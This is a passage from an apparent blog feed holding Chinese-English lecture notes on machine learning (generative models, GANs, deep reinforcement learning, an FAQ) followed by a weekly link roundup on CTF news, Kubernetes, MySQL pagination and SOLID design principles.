&lt;li&gt;Machine learning techniques include:  &lt;ul&gt;
&lt;li&gt;Supervised learning (if we have labelled data)  &lt;/li&gt;
&lt;li&gt;Reinforcement learning (if we have an environment for reward)  &lt;/li&gt;
&lt;li&gt;Unsupervised learning (if we do not have labelled data)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Semi-Supervised Learning&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;應用環境  &lt;ul&gt;
&lt;li&gt;沒有全部的 input data 都有 label 時  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;概念  &lt;ul&gt;
&lt;li&gt;The distribution of the unlabeled data provides some cues  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Transfer Learning&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;應用環境  &lt;ul&gt;
&lt;li&gt;Input data 中沒有 output 想要的 class label  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;概念  &lt;ul&gt;
&lt;li&gt;Using sufficient labeled data to learn a CNN  &lt;/li&gt;
&lt;li&gt;Using this CNN as feature extractor  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;舉例  &lt;ul&gt;
&lt;li&gt;研究生 vs 漫畫家  &lt;ul&gt;
&lt;li&gt;研究生 == 漫畫家  &lt;/li&gt;
&lt;li&gt;指導教授 == 責任編輯  &lt;/li&gt;
&lt;li&gt;跑實驗 == 畫分鏡  &lt;/li&gt;
&lt;li&gt;投稿期刊 == 投稿 Jump  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Unsupervised Learning&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;概念  &lt;ul&gt;
&lt;li&gt;Representation Learning: 化繁為簡  &lt;/li&gt;
&lt;li&gt;Generative Model: 無中生有  &lt;/li&gt;
&lt;li&gt;化繁為簡和無中生有的過程是相反的  &lt;ul&gt;
&lt;li&gt;化繁為簡：拿到很多跟樹有關的圖片，簡化得出一個代表樹的 output，學習到的是這些圖片共同的特徵  &lt;/li&gt;
&lt;li&gt;無中生有：code 經過 function 之後就生成很多跟樹很像的圖片  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Latent Factors  &lt;ul&gt;
&lt;li&gt;共同特徵  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;化繁為簡 Representation Learning  &lt;ul&gt;
&lt;li&gt;Autoencoder  &lt;ul&gt;
&lt;li&gt;希望能把比較重要的資訊壓縮到比較小的 pattern 裏面  &lt;/li&gt;
&lt;li&gt;represent the images of digits in a more compact way  &lt;/li&gt;
&lt;li&gt;Output of the hidden layer is the code  &lt;/li&gt;
&lt;li&gt;Deep autoencoder  &lt;/li&gt;
&lt;li&gt;Similar Image Retrieval  &lt;/li&gt;
&lt;li&gt;可以把 image 最重要的 feature 保留起來  &lt;/li&gt;
&lt;li&gt;For DNN Pre-Training  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Word Vector/Embedding  &lt;ul&gt;
&lt;li&gt;Machine learn the meaning of words from reading a lot of documents without supervision  &lt;/li&gt;
&lt;li&gt;A word can be understood by its context  &lt;/li&gt;
&lt;li&gt;類似的句型中，同樣位置的不相同詞可能有高度相關性  &lt;/li&gt;
&lt;li&gt;Prediction-Based  &lt;ul&gt;
&lt;li&gt;給前面的字 predict 下一個字 (Linear Model)  &lt;ul&gt;
&lt;li&gt;前面的字當 input，後面的字當 output，一直這樣接下去。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Various Architecture  &lt;ul&gt;
&lt;li&gt;Continuous bag of word (CBOW) model  &lt;ul&gt;
&lt;li&gt;給兩邊的字 predict 中間的字  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Skip-gram  &lt;ul&gt;
&lt;li&gt;給中間的字 predict 兩邊的字  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;完全不需要 label data，程式可以自己去學習這些詞之間的關係  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;無中生有 Generative model  &lt;ul&gt;
&lt;li&gt;概念  &lt;ul&gt;
&lt;li&gt;想讓程式自動幫我們生不同的 training data  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://blog.openai.com/generative-models/"&gt;https://blog.openai.com/generative-models/&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;PixelRNN  &lt;ul&gt;
&lt;li&gt;To create an image, generating a pixel each time  &lt;/li&gt;
&lt;li&gt;Can be trained just with a large collection of images without any annotation  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Generative Adversarial Network (GAN)  &lt;ul&gt;
&lt;li&gt;Discriminative vs Generative Models  &lt;ul&gt;
&lt;li&gt;Discriminative  &lt;ul&gt;
&lt;li&gt;learns a function that maps the input data (x) to some desired output class label (y)  &lt;ul&gt;
&lt;li&gt;directly learn the conditional distribution P(y|x)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Generative  &lt;ul&gt;
&lt;li&gt;tries to learn the joint probability of the input data and labels simultaneously, i.e. P(x,y)  &lt;ul&gt;
&lt;li&gt;can be converted to P(y|x) for classification via Bayes rule  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;generative models have the potential to understand and explain&lt;br /&gt;
the underlying structure of the input data even when there are no labels  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;跟演化的感覺有點類似  &lt;ul&gt;
&lt;li&gt;Generator  &lt;ul&gt;
&lt;li&gt;Hidden Layer (code) ===decode===&amp;gt; output layer =&amp;gt; output  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;概念  &lt;ul&gt;
&lt;li&gt;Two competing neural networks: generator &amp;amp; discriminator  &lt;/li&gt;
&lt;li&gt;noise ==generator==&amp;gt; generator sample =&amp;gt; discriminator ==yes/no==&amp;gt; data sample  &lt;/li&gt;
&lt;li&gt;generator 生出圖片，discriminator 判斷這張產生出來的圖片是不是真的  &lt;/li&gt;
&lt;li&gt;彼此之間會互相競爭學習  &lt;/li&gt;
&lt;li&gt;Training two networks jointly =&amp;gt; the generator knows how to adapt its parameters in order to produce output data that can fool the discriminator  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Examples  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://openai.com/blog/generative-models"&gt;Cifar-10&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;Generated Bedrooms  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/mattya/chainer-DCGAN"&gt;Comics Drawing&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;Pokémon Creation  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Reinforcement Learning&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;概念  &lt;ul&gt;
&lt;li&gt;Agent, Environment 之間彼此是可以互動的  &lt;/li&gt;
&lt;li&gt;Environment 會給 Agent 一個 Observation  &lt;/li&gt;
&lt;li&gt;Agent 會對這個 Observation 做出 Action  &lt;/li&gt;
&lt;li&gt;Environment 會根據 Action 的不同給予 Agent 不同的 Reward  &lt;/li&gt;
&lt;li&gt;根據 Reward 來學習要做或不做哪些行為  &lt;/li&gt;
&lt;li&gt;Agent learns to take actions to maximize expected reward.  &lt;/li&gt;
&lt;li&gt;困難點  &lt;ul&gt;
&lt;li&gt;可能的 sequence 是非常龐大的  &lt;/li&gt;
&lt;li&gt;很難調整，因為只拿得到一連串的 Actions 之後的 Reward，無法確定到底是錯在哪一個 Action  &lt;/li&gt;
&lt;li&gt;Reward may be delayed  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Supervised vs Reinforcement  &lt;ul&gt;
&lt;li&gt;Supervised  &lt;ul&gt;
&lt;li&gt;就像在學校裏面，每一步都有老師會帶領你，告訴你每一步是對是錯  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Reinforcement  &lt;ul&gt;
&lt;li&gt;做了一連串的動作以後，到一個正面或負面的回饋，不確定到底問題出錯在哪一個地方。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;範例  &lt;ul&gt;
&lt;li&gt;走迷宮  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Reinforcement Learning Approach  &lt;ul&gt;
&lt;li&gt;Policy-based RL  &lt;ul&gt;
&lt;li&gt;Search directly for optimal policy  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Value-based RL  &lt;ul&gt;
&lt;li&gt;Estimate the optimal value function  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Model-based RL  &lt;ul&gt;
&lt;li&gt;Build a model of the environment  &lt;/li&gt;
&lt;li&gt;Plan (e.g. by lookahead) using model  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Deep Reinforcement Learning  &lt;ul&gt;
&lt;li&gt;Idea: deep learning for reinforcement learning  &lt;ul&gt;
&lt;li&gt;Use deep neural networks to represent  &lt;/li&gt;
&lt;li&gt;Optimize loss function by SGD  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Value Function Approximation  &lt;/li&gt;
&lt;li&gt;Q-Networks  &lt;ul&gt;
&lt;li&gt;Q-networks represent value functions with weights  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Q-Learning  &lt;ul&gt;
&lt;li&gt;Goal: estimate optimal Q-values  &lt;ul&gt;
&lt;li&gt;Optimal Q-values obey a Bellman equation  &lt;/li&gt;
&lt;li&gt;Value iteration algorithms solve the Bellman equation  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Deep Q-Networks (DQN)  &lt;/li&gt;
&lt;li&gt;Stability Issues with Deep RL  &lt;ul&gt;
&lt;li&gt;Naive Q-learning oscillates or diverges with neural nets  &lt;ul&gt;
&lt;li&gt;Data is sequential  &lt;ul&gt;
&lt;li&gt;Successive samples are correlated, non-iid (independent and&lt;br /&gt;
identically distributed)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Policy changes rapidly with slight changes to Q-values  &lt;ul&gt;
&lt;li&gt;Policy may oscillate  &lt;/li&gt;
&lt;li&gt;Distribution of data can swing from one extreme to another  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Scale of rewards and Q-values is unknown  &lt;ul&gt;
&lt;li&gt;Naive Q-learning gradients can be unstable when backpropagated  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Stable Solutions for DQN  &lt;ul&gt;
&lt;li&gt;DQN provides a stable solutions to deep value-based RL  &lt;ul&gt;
&lt;li&gt;Use experience replay  &lt;ul&gt;
&lt;li&gt;Break correlations in data, bring us back to iid setting  &lt;/li&gt;
&lt;li&gt;Learn from all past policies  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Freeze target Q-network  &lt;ul&gt;
&lt;li&gt;Avoid oscillation  &lt;/li&gt;
&lt;li&gt;Break correlations between Q-network and target  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Clip rewards or normalize network adaptively to sensible range  &lt;ul&gt;
&lt;li&gt;Robust gradients  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;DQN in Atari  &lt;ul&gt;
&lt;li&gt;Goal: end-to-end learning of values Q(s, a) from pixels  &lt;ul&gt;
&lt;li&gt;Input: state is stack of raw pixels from last 4 frames  &lt;/li&gt;
&lt;li&gt;Output: Q(s, a) for all joystick/button positions a  &lt;/li&gt;
&lt;li&gt;Reward is the score change for that step  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;DQN in E2E Task-Completion Bot  &lt;ul&gt;
&lt;li&gt;Simulated User  &lt;ul&gt;
&lt;li&gt;Generate interactions based on a predefined fake goal  &lt;/li&gt;
&lt;li&gt;Automatically learn strategy by training on the simulated data  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Model-Based Deep RL  &lt;ul&gt;
&lt;li&gt;Goal: learn a transition model of the environment and plan based on the transition model  &lt;/li&gt;
&lt;li&gt;Model-based deep RL is challenging, and so far has failed in Atari  &lt;/li&gt;
&lt;li&gt;Model-Based Deep RL in AlphaGo  &lt;ul&gt;
&lt;li&gt;Monte-Carlo tree search (MCTS)  &lt;ul&gt;
&lt;li&gt;MCTS simulates future trajectories  &lt;/li&gt;
&lt;li&gt;Builds large lookahead search tree with millions of positions  &lt;/li&gt;
&lt;li&gt;State-of-the-art Go programs use MCTS  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Convolutional Networks  &lt;ul&gt;
&lt;li&gt;12-layer CNN trained to predict expert moves  &lt;/li&gt;
&lt;li&gt;Raw CNN (looking at 1 position, no search at all) equals performance of MoGo with 105 position search tree  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;More Applications  &lt;ul&gt;
&lt;li&gt;AlphaGo  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.youtube.com/watch?v=0JL04JJjocc"&gt;Flying Helicoptor&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.youtube.com/watch?v=0xo1Ldx3L5Q"&gt;Driving&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.bloomberg.com/news/articles/2016-07-19/google-cuts-its-giant-electricity-bill-with-deepmind-powered-ai"&gt;Google Cuts Its Giant Electricity Bill With DeepMind-Powered AI&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://universe.openai.com/"&gt;OpenAI Universe&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;Software platform for measuring and training an AI's general&lt;br /&gt;
intelligence via the &lt;a href="https://gym.openai.com/"&gt;OpenAI gym&lt;/a&gt; environment  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h1&gt;Conclusion&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;Machine Learning &amp;amp; Deep Learning 需要  &lt;ul&gt;
&lt;li&gt;足夠的運算資源  &lt;/li&gt;
&lt;li&gt;各種經驗及技巧  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h3&gt;FAQ&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Deep Learning 的 model 會是 non-linear 的  &lt;/li&gt;
&lt;li&gt;機器翻譯目前在台灣的狀況如何？要如何著手？  &lt;ul&gt;
&lt;li&gt;機器翻譯的話，目前在國外算是滿成熟的，目前會使用 RNN 來做。  &lt;/li&gt;
&lt;li&gt;如果是台語的部份，目前好像比較少看到，會是個還有發展空間的方向。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;為什麼需要 Activation Function？他在 Deep Learning 中扮演的角色是什麼？  &lt;ul&gt;
&lt;li&gt;處理 non-linear 的部份，如果沒有 Actication Function 的話，多層的結果用一層就可以去表示。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;為什麼會選擇 Sigmoid 作為 Activation Function?  &lt;ul&gt;
&lt;li&gt;其實有很多種 Activation Function，拿 Sigmoid 來講是因為他比較簡單，把 output 壓在 -1~1 之間  &lt;/li&gt;
&lt;li&gt;另外一個比較常見的是 Relu 這個 Activation Function  &lt;ul&gt;
&lt;li&gt;0 以下的就刪除掉  &lt;/li&gt;
&lt;li&gt;避免 information 被壓縮的太小，用來解決經過太多層之後 information 被壓得太小。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Deep Learning 的最佳化要具備哪些能力  &lt;ul&gt;
&lt;li&gt;如果是純理論的部份會跟數學方面相關。  &lt;/li&gt;
&lt;li&gt;但如果是實務上的 task，會跟該 task 的 domain knowledge 比較相關。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;CNN 對於影像旋轉是否也有夠好的識別度？  &lt;ul&gt;
&lt;li&gt;第一個作法就是把你的 training data 也旋轉過再丟進去訓練  &lt;/li&gt;
&lt;li&gt;另外一個作法是使用會考慮旋轉相關的 model 放進去 train，input data 不需要特別旋轉過  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;學 Machine Learning 需要學習微積分、統計和線性代數嗎？  &lt;ul&gt;
&lt;li&gt;基本的微積分概念是要的，但沒有很複雜，如果完全不會微分的話要學一下。  &lt;/li&gt;
&lt;li&gt;統計的話基本概念要有，但不會太多。&lt;br /&gt;
 線性代數是最重要的，會看到很多 vector, matrix 以及 space 上的處理，有很多假設是必須要知道的。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;</summary><category term="Deep Learning"></category><category term="DNN"></category><category term="CNN"></category><category term="RNN"></category><category term="Machine Learning"></category></entry><entry><title>Y2017W31</title><link href="https://blog.m157q.tw/posts/2017/08/07/y2017w31/" rel="alternate"></link><published>2017-10-17T21:09:27+08:00</published><updated>2017-10-17T21:09:27+08:00</updated><author><name>M157q</name></author><id>tag:blog.m157q.tw,2017-08-07:posts/2017/08/07/y2017w31/</id><summary type="html">&lt;h3&gt;blog&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://blog.heron.me/how-can-a-kid-prepare-for-the-future-e48394f24ba0?source=rss----d0ef0e7db3bd---4&amp;amp;gi=2e0d3b9ec672"&gt;How can a kid prepare for the future? – Heron’s Blog&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;How would you succeed if you only do things that “others want”? 寫得好  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://hellolynn.hpd.io/2017/07/28/%e6%ac%a1%e4%b8%96%e4%bb%a3%e9%80%9a%e8%a8%8a%e8%a6%8f%e6%a0%bc%e2%94%805g/"&gt;物聯網、VR、人工智慧，通通得仰賴的次世代通訊規格─5G – 寫點科普，請給指教。&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://data.leafwind.tw/build-software-engineering-and-data-culture-before-doing-ai-6e345986f872?gi=f8c26725a57f"&gt;先有軟體與數據文化，才有AI – all about data&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;「沒有軟體工程文化、不重視數據，就沒有絲毫追趕 AI 的可能性」  &lt;/li&gt;
&lt;li&gt;這個副標題實在太中肯了  &lt;/li&gt;
&lt;li&gt;多少公司都是這樣妄想一步登天  &lt;/li&gt;
&lt;li&gt;唉  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://medium.com/@AlbertHuang314/%E5%AF%AB%E5%AF%A6%E9%A9%97%E7%B4%80%E9%8C%84%E6%88%96%E5%B7%A5%E4%BD%9C%E6%97%A5%E8%AA%8C%E7%9A%84%E9%87%8D%E8%A6%81%E6%80%A7-eee6115760ef"&gt;寫實驗紀錄或工作日誌的重要性 – Albert Huang – Medium&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;每天花一點時間寫可以為自己之後省下不少時間呢，要查找一些相關資訊也會方便許多，之前的作法就是每天在相關的 issue 留下本日的進度，也方便自己隔天工作的時候可以快速進入狀況。  &lt;/li&gt;
&lt;li&gt;聽起來很簡單，但做起來不那麼簡單，每天要下班之前得花一段時間來整理並確認今天到底做了哪些事，一忙起來有時候就會無法做到。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;cli&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://blog.longwin.com.tw/2017/08/linux-find-limit-date-time-file-2017/amp/"&gt;Linux 使用 find 找出限定修改時間內的檔案 - Tsung's Blog&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;-mtime&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;-mmin&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;-ctime&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;-cmin&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;-atime&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;-amin&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;ctf&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://maskray.me/blog/2017-08-01-defcon-25-ctf"&gt;DEFCON 25 CTF参赛记 | MaskRay&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;原來 cLEMENCy 不只 9-bit byte 還有 27-bit register width 和 middle-endian 真夠怪  &lt;/li&gt;
&lt;li&gt;HITCON 跟第三名差不少分 好猛啊  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;defcon&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/legitbs/cLEMENCy"&gt;GitHub - legitbs/cLEMENCy: cLEMENCy is the LEgitbs Middle ENdian Computer architecture developed by Lightning for DEF CON CTF 2017&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;GitHub is home to over 20 million developers working together to host and review code, manage projects, and build software together.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;gke&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://thylong.com/ci/2016/deploying-from-travis-to-gce/"&gt;Deploying from Travis-CI to Google Container Engine | blog&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;Travis-ci is a great CI tool. In comparison to other solutions, it has the advantage of being free for Open Source projects and is well documented.  This is why I’ve been using it for a while and more recently with regexrace, a project hosted in Google Container Engine cluster.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://medium.com/google-cloud/continuous-delivery-in-a-microservice-infrastructure-with-google-container-engine-docker-and-fb9772e81da7"&gt;Continuous Delivery in a microservice infrastructure with Google Container Engine, Docker and…&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;Nowadays Continuous Integration (CI) has become a de facto standard for modern tech companies and startups. There are several options of how you can setup your perfect CI environment, from using your own Jenkins cluster to third-party services like Travis or CircleCI.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;golang&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/campoy/go-tooling-workshop"&gt;GitHub - campoy/go-tooling-workshop: A workshop covering all the tools gophers use in their day to day life&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;k8s&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/janetkuo/k8s-demos"&gt;janetkuo/k8s-demos: Demo scripts for Kubernetes built-in controllers&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/kubernetes/contrib/tree/master/micro-demos"&gt;contrib/micro-demos at master · kubernetes/contrib&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://docs.google.com/presentation/d/1fBnd7Z2yKpT25Ib2ThF7vHJi0AfVKHYnSrAYqvBSigg/edit?usp=embed_facebook&amp;amp;usp=embed_facebook&amp;amp;usp=embed_facebook&amp;amp;usp=embed_facebook"&gt;GCPUG.TW meetup #28 - GKE上運作您的K8S服務 - Google Slides&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.slideshare.net/walterliu7/kubernetes-workshop-78554820"&gt;Kubernetes Workshop&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;mysql&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.eversql.com/faster-pagination-in-mysql-why-order-by-with-limit-and-offset-is-slow/"&gt;Why Order By With Limit and Offset is Slow - Faster Pagination in Mysql&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;Queries with LIMITs and OFFSETs are common in application that require pagination and in some cases might work well for a while.   In many cases though, they become slow and painful once the OFFSET has a high value.  Well, in most cases, low offset queries are not slow.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;programmer&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://thinkgrowth.org/why-good-people-leave-large-tech-companies-af2b6fea4ee"&gt;Why Good People Leave Large Tech Companies – ThinkGrowth.org&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;I was visiting with an ex-student who’s now the CFO of a large public tech company. The company is still one of the hottest places to work in tech. They make hardware with a large part of their innovation in embedded software and services.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;後來還是覺得得先進這些大公司累積一些經驗後，才有本錢自己出去闖啊。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/kamranahmedse/developer-roadmap"&gt;GitHub - kamranahmedse/developer-roadmap: Roadmap to becoming a web developer in 2017&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.producthunt.com/@alison985/collections/hard-core-tech-books-that-interest-me"&gt;Hard Core Tech Books That Interest Me by alison985 - Product Hunt&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;programming&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://scotch.io/bar-talk/s-o-l-i-d-the-first-five-principles-of-object-oriented-design"&gt;S.O.L.I.D: The First 5 Principles of Object Oriented Design ― Scotch&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;These principles, when combined together, make it easy for a programmer to develop software that are easy to maintain and extend. They also make it easy for developers to avoid code smells, easily refactor code, and are also a part of the agile or adaptive software development.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;這篇很清楚的介紹了 OOP 裡頭會提到的 SOLID 各自代表什麼意思，也有給出實際程式碼的例子，排版也很乾淨舒服。  &lt;/li&gt;
&lt;li&gt;仔細想想大學修 OOP 的時候好像根本沒提到這個，只是在學 C++，修軟體工程的時候好像也只有提到 KISS。出來工作後也看到很多物件導向的程式碼沒照這個原則走，自己其實也沒有很嚴格遵守，現在看起來，如果都可以遵守的話，程式碼一定會好改不少吧，期許自己之後在寫物件導向有關的程式碼的時候可以謹記這 5 個原則。  &lt;/li&gt;
&lt;li&gt;SOLID  &lt;ul&gt;
&lt;li&gt;S - Single-responsiblity principle  &lt;ul&gt;
&lt;li&gt;A class should have one and only one reason to change, meaning that a class should have only one job.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;O - Open-closed principle  &lt;ul&gt;
&lt;li&gt;Objects or entities should be open for extension, but closed for modification  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;L - Liskov substitution principle  &lt;ul&gt;
&lt;li&gt;Let q(x) be a property provable about objects of x of type T. Then q(y) should be provable for objects y of type S where S is a subtype of T.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;I - Interface segregation principle  &lt;ul&gt;
&lt;li&gt;A client should never be forced to implement an interface that it doesn't use or clients shouldn't be forced to depend on methods they do not use.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
